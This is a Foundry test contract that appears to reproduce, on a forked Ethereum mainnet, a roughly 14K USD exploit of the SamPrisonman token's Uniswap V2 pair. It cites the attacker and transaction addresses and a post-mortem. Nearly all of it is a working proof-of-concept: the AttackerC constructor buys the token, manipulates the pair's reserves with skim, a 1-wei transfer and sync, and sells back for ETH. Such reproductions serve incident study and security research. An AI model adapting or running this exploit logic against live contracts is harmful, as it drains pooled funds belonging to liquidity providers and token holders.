pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 14K USD
// Attacker : https://etherscan.io/address/0x97d8170e04771826a31c4c9b81e9f9191a1c8613
// Attack Contract : https://etherscan.io/address/0x2901c8b8e6d9f2c9f848987ded74b776ab1f973e
// Vulnerable Contract : https://etherscan.io/address/0x76ea342bc038d665e8a116392c82552d2605eda1
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x6c8aed8d0eab29416cd335038cd5ee68c5e27bfb001c9eac7fc14c7075ed4420?line=0

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x76ea342bc038d665e8a116392c82552d2605eda1

// @Analysis
// Post-mortem : https://x.com/CertiKAlert/status/1897973904653607330
// Twitter Guy : https://x.com/CertiKAlert/status/1897973904653607330
// Hacking God : N/A

address constant SamPrisonman = 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700;
address constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant UniswapV2Pair = 0x76EA342BC038d665e8a116392c82552D2605edA1;
address constant addr1 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant addr2 = 0xaCa4263fFddA9E60C7260AAbA08c2b8F80D63cB1;
address constant attacker = 0x97d8170e04771826A31C4c9B81E9f9191a1C8613;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 21992033);
        deal(attacker, 4e-15 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC{value: 4e-15 ether}();
        // deal(address(attC), 4e-15 ether);
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

contract AttackerC {
    constructor() payable {
        (bool s1, ) = addr2.call(abi.encodeWithSelector(bytes4(0x4f49cd31)));
        s1;

        address[] memory path = new address[](2);
        path[0] = addr1;
        path[1] = SamPrisonman;
        (bool s2, ) = UniswapV2Router02.call{value: address(this).balance}(
            abi.encodeWithSelector(
                IUniswapV2Router02.swapExactETHForTokensSupportingFeeOnTransferTokens.selector,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        s2;

        (bool s3, ) = UniswapV2Pair.call(abi.encodeWithSelector(IUniswapV2PairLike.skim.selector, UniswapV2Pair));
        s3;

        (bool s4, ) = SamPrisonman.call(abi.encodeWithSelector(ISamPrisonman.transfer.selector, UniswapV2Pair, uint256(1)));
        s4;

        (bool s5, ) = UniswapV2Pair.call(abi.encodeWithSelector(IUniswapV2PairLike.sync.selector));
        s5;

        uint256 bal = 0;
        (bool s6, bytes memory r6) = SamPrisonman.call(abi.encodeWithSelector(ISamPrisonman.balanceOf.selector, address(this)));
        if (s6 && r6.length >= 32) {
            bal = abi.decode(r6, (uint256));
        }

        (bool s7, ) = SamPrisonman.call(abi.encodeWithSelector(ISamPrisonman.approve.selector, UniswapV2Router02, type(uint256).max));
        s7;

        address[] memory path2 = new address[](2);
        path2[0] = SamPrisonman;
        path2[1] = addr1;
        (bool s8, ) = UniswapV2Router02.call(
            abi.encodeWithSelector(
                IUniswapV2Router02.swapExactTokensForETHSupportingFeeOnTransferTokens.selector,
                bal,
                0,
                path2,
                tx.origin,
                block.timestamp
            )
        );
        s8;
    }

    receive() external payable {}
}

interface ISamPrisonman {
	function approve(address, uint256) external returns (bool);
	function balanceOf(address) external returns (uint256);
	function transfer(address, uint256) external returns (bool); 
}
interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256, uint256, address[] calldata, address, uint256) external;
	function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256, address[] calldata, address, uint256) external payable; 
}
interface IUniswapV2PairLike {
    function skim(address to) external;
    function sync() external;
}